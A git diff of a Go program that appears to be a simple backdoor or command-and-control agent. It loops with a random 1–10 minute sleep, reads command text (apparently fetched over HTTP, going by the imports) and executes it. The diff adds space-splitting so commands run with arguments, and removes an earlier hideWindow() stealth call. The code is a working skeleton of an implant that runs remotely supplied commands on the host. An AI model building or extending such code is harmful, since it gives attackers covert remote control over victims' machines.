@@ -11,16 +11,15 @@ import (
         "io/ioutil"
         "net/http"
         "time"
-        "syscall"
+        "strings"
 )
 
 func main() {
-        hideWindow()
         // Seed the random number generator with the current time
         rand.Seed(time.Now().UnixNano())
 
         for {
-                // Generate a random sleep duration between 1 and 5 minutes
+                // Generate a random sleep duration between 1 and x minutes
                 sleepDuration := time.Duration(rand.Intn(10)+1) * time.Minute
 
                 time.Sleep(sleepDuration)
@@ -50,15 +49,17 @@ func runCommand() {
     }
   
 // Convert the byte slice to a string
-    fileContent := string(fileBytes)
+    cmdContent := string(fileBytes)
 
-// Print the file contents
-//    fmt.Println(fileContent)
+// Uncomment to test what the command looks like
+//    fmt.Println(cmdContent)
 
-
-// Replace "ls" with the command you want to run
-        //cmd := exec.Command("ls", "-l")
-        cmd := exec.Command(fileContent)
+// To handle commands with space and args
+        args := strings.Split(cmdContent, " ")
+        
+// Command Execution
+        //cmd := exec.Command(cmdContent)
+        cmd := exec.Command(args[0], args[1:]...)
         // Run the command and get the output
         output, err := cmd.Output()
         if err != nil {
